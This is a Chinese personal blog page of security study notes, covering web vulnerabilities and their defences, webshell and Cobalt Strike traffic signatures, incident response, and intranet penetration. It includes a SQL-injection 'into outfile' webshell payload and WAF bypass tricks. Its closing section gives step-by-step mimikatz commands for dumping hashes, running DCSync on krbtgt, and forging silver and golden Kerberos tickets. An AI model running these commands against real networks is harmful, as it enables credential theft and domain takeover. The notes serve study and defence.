
<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
        <title>笔记 | 𝓐𝓵𝓲𝓬𝓮01</title>
        <meta name="author" content="alice01">
        <meta name="description" content="𝓗𝓪𝓹𝓹𝔂 𝓼𝓾𝓰𝓪𝓻 𝓵𝓲𝓯𝓮.">
        <meta name="keywords" content="">
        <link rel="icon" href="/images/avatar.jpg">
        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
        <link rel="stylesheet" href="/css/fonts.min.css">
        <link rel="stylesheet" href="/css/particlex.css">
        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
    <meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
        <div id="layout">
            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
            <transition name="into">
                <div v-show="show_page" style="display: -not-none">
                    <div id="menu_show">
                         
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">𝓐𝓵𝓲𝓬𝓮01</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;about</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;tags</span>
        </a>
        
    </div>
    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
        <div :class="'title'" @click="menu_show = !menu_show">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;𝓐𝓵𝓲𝓬𝓮01</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="menu_show">
            
            <a href="/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
                </div>
            </a>
            
            <a href="/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
                </div>
            </a>
            
            <a href="/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
                </div>
            </a>
            
            <a href="/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
                </div>
            </a>
            
            <a href="/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>
                    </div>
                    <div id="main">
                        
<div class="article">
    <div>
        <h1>笔记 </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
            </span>
            2023/4/18
        </span>
        
        
    </div>
    <div class="content" v-pre>
        <p><span style="color:green;">php函数 命令执行</span><br>System exec shell_exec popen passthru<br>文件读取: file readfile fopen 代码执行:eval assert creat_function array_map<br><span style="color:green;">常见端口:</span> ftp21 ssh22 telnet23 smtp25 win远程3389 http80 https443 weblogic7001 mysql3306 redis6379 Oracle1521 sqlserver1433 db2 5000<br><span style="color:green;">同源策略:</span>同协议,端口,域名共享cookie<br><span style="color:green;">中间件漏洞</span><br>iis: PUT任意文件写入,解析漏洞,短文件名,rce<br>apache: 解析漏洞,目录遍历<br>nginx:文件解析,目录穿越,目录遍历<br>tomcat: 远程代码执行,war后门文件部署<br>jboss: 反序列化漏洞、war后门文件部署<br>WebLogic:反序列化漏洞,SSRF,war后门文件部署</p>
<p><span style="color:red;">应急响应:启动项 临时文件 进程 计划任务 账户 日志 服务</span></p>
<p>owasp top10: 注入 XSS XXE 反序列化<br>敏感数据泄露<br>失效身份认证 失效访问控制 安全配置错误<br>使用含已知漏洞的组件 不足的日志记录和监控</p>
<p>rce:没对接口输入严格判断,恶意代码非法执行<br>    防御: (1)用eval的地方严格处理数据(2)用json不用eval</p>
<p>csrf: 盗用受害者的身份发送恶意请求<br>    防御: (1)验证referer	(2)验证token token安全级更高 因为随机</p>
<p>xxe: 解析了攻击者伪造的xml<br>    危害: (1)文件读取 (2)命令执行 (3)内网端口探测<br>    防御: (1)禁用xml(2)过滤xml</p>
<p>ssrf: 服务器对其他服务器资源进行请求没有过滤<br>    危害:(1)端口扫描(2)指纹识别(3)文件读取(4)内网探针<br>    绕过:(1)@符号(2)点分割符号(3)ip进制转换<br>防御: (1)url白名单(2)校验返回内容(3)过滤内部ip<br>协议:(1)file(2)dict(3)gopher(4)http</p>
<p>反序列化: 序列化是将对象转化为序列,反序列化相反,过滤不严就能执行<br>防御:白名单</p>
<p>upload: 恶意文件伪装成正常文件上传并被执行<br>防御:(1)黑&#x2F;白名单(2)js校验(3)mime检测(4)文件头校验(5)文件内容校验(6)隐藏上传路径(7)禁止文件执行<br>条件竞争:上传文件没校验,上传成功才判断格式是否符合白名单,符合就重命名,不符合删除<br>二次渲染:根据上传的图片,新生成一个图片,将原始图片删除，将新图片添加到数据库中</p>
<p>include: 引入一段代码,并让服务器通过用户可控的动态变量引入文件<br>伪协议: (1)file (2)data (3)php:filter(4)php:input<br>函数: 1.include()2.require()3.include_once()4.require_once()<br>危害:(1)读取敏感文件(2)包含入木马<br>防御:(1)白名单(2)过滤危险字符(3)allow_url_include&#x3D;off(4)allow_url_fopen&#x3D;off(5)open_basedir&#x3D;指定目录</p>
<p>xss原理: 将恶意js插入Web页面中，浏览时会被触发<br>反射型: 不保存而是反射回受害者浏览器<br>存储型: 存入数据库,从数据库取出数据执行<br>DOM型: 不与服务器交互,通过DOM输出<br>绕过: (1)大小写&#x2F;双写(2)事件(3)伪协议：a href&#x2F;src<br>防御: (1)对输入编码(2)对cookie httponly (3)urlencode检测<br>Httponly:禁止js读取,如果cookie中的一个参数带有httponly，则这个参数将不能被js获取；httponly可以防止xss会话劫持攻击</p>
<p>sqli原理: 把SQL插入Web表单,提交请求查询,欺骗服务器执行<br> 类型:(1)报错注入(2)布尔(3)时间(4)联合(5)堆叠<br>绕过: (1)大小&#x2F;双写(2)注释符号&#x2F;**&#x2F; &lt;&gt;(3)编码:url十六进制ascii码<br>防御: (1)过滤,转义,替换,删除 (2)预编译 (3)waf</p>
<p>判断注入点:(1)’报错(2)and1&#x3D;1&#x2F;and1&#x3D;2布尔(3)sleep()时间<br>‘被过滤用双单引号,宽字节,十六进制0x27,ascii码char(39)绕</p>
<p><span style="color:green;">宽字节注入</span><br>假如’被转义为\ ‘,其中\十六进制是%5c,mysql的GBK认为%df%5c是个宽字节,也就是’運’,使’逃逸出来<br><span style="color:green;">二次注入</span><br>脏数据存入数据库后,被直接取出并进入SQL查询语句<br><span style="color:green;">盲注sleep()函数禁用</span><br>同样功能的函数代替，比如benchmark() Get_lock()函数<br><span style="color:green;">报错注入的函数</span><br>updatexml(),exp(),floor(),join()<br><span style="color:green;">sqli写shell</span><br>通过outfile,将马写入eval.php<br>?id&#x3D;1 union select 1,”<?马?>“ into outfile ‘绝对路径’<br>权限要求：物理路径,写入权限,file权限</p>
<p><span style="color:rgb(255, 0, 255);">菜刀流量特征</span><br>(1)eval()<br>(2)(base64_decode($_POST[z0]))<br>(3) &amp;z0&#x3D;QGluaV9zZXQ… 传payload<br><span style="color:rgb(255, 0, 255);">蚁剑流量特征：php用base64加密</span><br> (1)user-agent: antswordxxx<br> (2)@ini_set(“display_errors”,”0”);<br> (3)”_0x…..&#x3D;” 加密<br><span style="color:rgb(255, 0, 255);">冰蝎流量特征:aes对称加密</span><br>二(1)内置十余ua<br>(2)Accept: text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, <em>&#x2F;</em>; q&#x3D;.2<br>(3)Content-Length: 16<br>三(1)Accept:application&#x2F;xhtml+xmlapplication&#x2F;xmlapplication&#x2F;signed-exchange<br>(2)16个ua<br>(3)Content-Type: application&#x2F;octet-stream<br>四(1)Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01<br>(2)Content-type: Application&#x2F;x-www-form-urlencoded<br>(3)10种ua<br><span style="color:rgb(255, 0, 255);">哥斯拉流量特征: base64加密</span><br>(1)cookie最后;<br>(2)ua弱特征<br>(3)连接状态pass&#x3D;<br><span style="color:rgb(255, 0, 255);">cs流量</span><br>1、http-beacon默认get,请求头存在cookie<br>2、dns-beacon默认使用cdn.、www6.、api.、www.、post<br>3、心跳包间隔一定时间，均有通信<br>4、User-Agent： Cobalt Strike<br>5、HTTP请求中可能包含与C2服务器通信的命令和控制信息</p>
<p><span style="color:red;">内存马</span>		<br>1 先判断方法如filter或listener就有大量url请求路径相同参数不同的，或者页面不存在但是返回200的<br>2 看是否有类似哥斯拉冰蝎相同的url请求<br>通过查找返回200的url路径对比web目录下是否存在文件,不存在大概率为内存马<br>3 如web日志没异常,可排查是否中间件漏洞导致代码执行注入内存马，<br>4 排查中间件error.log日志看是否有可疑的报错<br><span style="color:red;">Weblogic 反序列化</span><br>7001端口默认开启T3协议,T3协议触发的Weblogic Server WLS Core Components可以构造恶意T3数据<br><span style="color:red;">fastjson反序列化</span><br>​autotype导致攻击者可以控制@type调用set&#x2F;get方法反序列化<br><span style="color:red;">Shiro反序列化</span> Shiro框架提供RemeberMe,登录后生成cookie,服务端接收cookie值调用反序列化时没有过滤<br>550和721区别:550不需要Remember Cookie<br>流量特征:返回包包含RemenberMe&#x3D;deleteMe字段<br><span style="color:red;">log4j2 rce</span><br>log4j2框架的lookup提供{}字段解析,可以JNDI注入<br><span style="color:red;">struts2 rce</span><br>提交表单验证失败时,会将提交值使用 OGNL 表达式 %{value} 解析重新填充到表单</p>
<p>Fastjson是否成功<br>1.请求头：POST content_type: application&#x2F;json<br>2.请求体：data:包含@type<br>3.请求体: 包含C2地址<br>4.状态码：400或500<br>5.态势感知回溯分析</p>
<p>Log4j2是否成功<br>1、dnslog类：看源ip与dnslog的外联日志<br>2命令执行回显:响应体中存在命令执行结果</p>
<p>struts2是否成功<br>1.OGNL表达式<br>2.命令执行代码<br>3.返回命令执行结果</p>
<p>weblogic  waf饶过<br>1.添加多个反斜杠<br>2.添加无用的GET参数<br>3.URL编码混淆掺杂<br>4.请求包XML标签内掺脏数据<br>5.请求包头加脏数据<br>6.请求包加XML注释</p>
<p>shiro WAF绕过<br>第一种方法:rememberMe&#x3D;加密payload+&#x3D;&#x3D;垃圾数据填充饶过</p>
<p><span style="color:green;">溯源: 攻击源捕获-溯源处置-攻击者画像</span><br>捕获(1)​告警 ​ 日志 蜜罐	钓鱼邮件<br>处置(2)分析恶意样本+社工定位身份&amp;ip<br>画像:(1)目的&amp;手法(2)身份&amp;单位</p>
<p><span style="color:red;">内网渗透思路</span><br>信息收集  提权 爆密码&#x2F;hash ipc&#x2F;smb连接 pth&#x2F;t&#x2F;k横向  黄金&#x2F;白银维权 清日志 (隧道代理&#x2F;免杀)<br><span style="color:red;">Windows提权</span><br>内核溢出<br>at,sc,ps<br>数据库<br>进程注入<br>令牌窃取<br>DLL劫持<br>引号路径<br>服务权限<br><span style="color:red;">Linux提权</span><br>内核溢出<br>crontab<br>数据库<br>path<br>Suid<br>三方服务</p>
<p>后渗透权限维持<br>Linux<br>    ssh后门&#x2F;密钥<br>    任务计划后门<br>    后面账号uid为0<br>    隐藏文件<br>    Rootkits<br>Windows<br>    注册表<br>    启动项<br>    计划任务<br>    服务<br>    各类劫持</p>
<p>ms漏洞编号<br>MS08-067	MS14-058	</p>
<p><span style="color:red;">银票与黄票区别</span><br>1.银票伪造tgs仅限于特定服务器的特定服务,需要目标服务账号的hash,日志都在目标服务器上<br>2.金票伪造tgt权限最高,需要krbtgt的密码hash<br><span style="color:red;">银票与金票制作</span><br>银票制作：<br>        1.域名称<br>        2.域的SID值<br>        3.域的服务账户的密码HASH<br>        4.伪造的用户名，可以是任意用户名，一般伪造administrator<br>        5.需要访问的服务<br>        第一步：<br>        管理员权限运行<br>        mimikatzprivilege::debug #提升权限<br>        sekurlsa::logonpasswords #获取service账户hash 和sid(同一个域下得sid一样<br>        第二步：<br>        清空本地票据缓存<br>        kerberos::purge #清理本地票据缓存<br>        kerberos::list #查看本地保存的票据<br>        第三步：<br>        伪造白银票据并导入<br>        kerberos::golden &#x2F;domain:superman.com &#x2F;sid:S-1-5-21-259090122-541454442-2960687606 &#x2F;target:win08.superman.com &#x2F;rc4:f6f19db774c63e49e9af61346adff204 &#x2F;service:cifs &#x2F;user:administrator &#x2F;ptt<br>        第四步：<br>        访问域控的共享目录<br>        dir \win08\c$<br>        远程登陆，执行命令<br>        PsExec.exe \win08 cmd.exe	<br>金票制作:<br>            1.域名称[AD PowerShell模块：（Get-ADDomain）.DNSRoot]<br>            2.域的SID 值[AD PowerShell模块：（Get-ADDomain）.DomainSID.Value]<br>            3.域的KRBTGT账户NTLM密码哈希<br>        1. 获取域控制器的 krbtgt 哈希值<br>            在域控制器上操作：<br>            通过 mimikatz 输入命令获取 ktbtgt 的哈希值：lsadump::dcsync &#x2F;domain:dc.com &#x2F;user:krbtgt<br>            也可以通过wce、gethashes等方式获取<br>        2. 伪造票据（低权限域用户在客户端上伪造）<br>            在 dc域下的设备（Windows 10）上操作：<br>            得到 KRBTGT HASH 之后使用 mimikatz 中的 kerberos::golden 功能生成金票 golden.kiribi，即为伪造成功的TGT。<br>            参数说明：<br>            &#x2F;admin:伪造的用户名<br>            &#x2F;domain:域名称<br>            &#x2F;sid:SID 值，域的SID<br>            &#x2F;krbtgt:krbtgt 的 NTLM-HASH 值<br>            &#x2F;ticket:生成的票据名称<br>            生成金票命令：kerberos::golden &#x2F;admin:administrator &#x2F;domain:test.com &#x2F;sid:S-1-5-21-593020204-2933201490-533286667 &#x2F;krbtgt:8894a0f0182bff68e84bd7ba767ac8ed &#x2F;ticket:golden.kiribi<br>        3. 获取权限<br>            清空本地票据缓存，导入伪造的票据<br>            查看本地保存的票据，观察Client name：kerberos::list<br>            清理本地票据缓存：kerberos::purge<br>            导入伪造的黄金票据：kerberos::ptt golden.kiribi<br>            查看本地保存的票据，观察Client name：kerberos::list<br>        4. 利用伪造的黄金票据<br>            在 yuming域下的设备（Windows 10）上操作：<br>            直接利用psexec.exe远程登录和执行命令<br>            Whoami显示当前用户为 dc域的administrator用户<br>            PsExec.exe \域控计算机名 cmd.exe</p>
<p><span style="color:red;">正反向shell</span><br>正向Shell：攻击者连接被攻击者 [用于攻击者内网,被攻击者公网]<br>反向Shell：被攻击者主动连接攻击者 [用于攻击者公网,被攻击者内网]<br><span style="color:red;">正反向代理</span><br>    1、正向代理实际代理的是客户端。反向代理代理的是目标服务器。<br>    2、正向代理中，服务器不知道真正的用户是谁。反向代理中，用户不知道真正的服务器是谁。<br>    3、正向代理主要用来解决访问问题。反向代理主要用于解决负载均衡、安全防护，但二者都能提高访问速度。</p>
<p>隧道:<br>    网络层：IPv6,ICMP<br>    传输层：TCP,UDP<br>    应用层：SSH,HTTP,HTTS,DNS</p>
<p>黑链:隐藏链接,通常指向非法网站,可通过查看源码排查</p>
<p>osi模型:物理层,数据链路层,网络层icmp,传输层tcp&#x2F;udp,会话层,表示层,应用层dns,ssh</p>
<p>windows下载: (1)powershell(2)ftp(3)wget(4)vbs</p>

    </div>
    
</div>
                         
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 2022 - 2023 𝓐𝓵𝓲𝓬𝓮01
            <span class="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            @alice01
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
        
    </div>
</footer>
                    </div>
                </div>
            </transition>
            <div id="img_show">
                <img id="img_content" alt="img_show">
            </div>
        </div>
        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
        <script src="/js/particlex.js"></script>
        <script src="/js/showimg.js"></script>
        

    </body>
</html>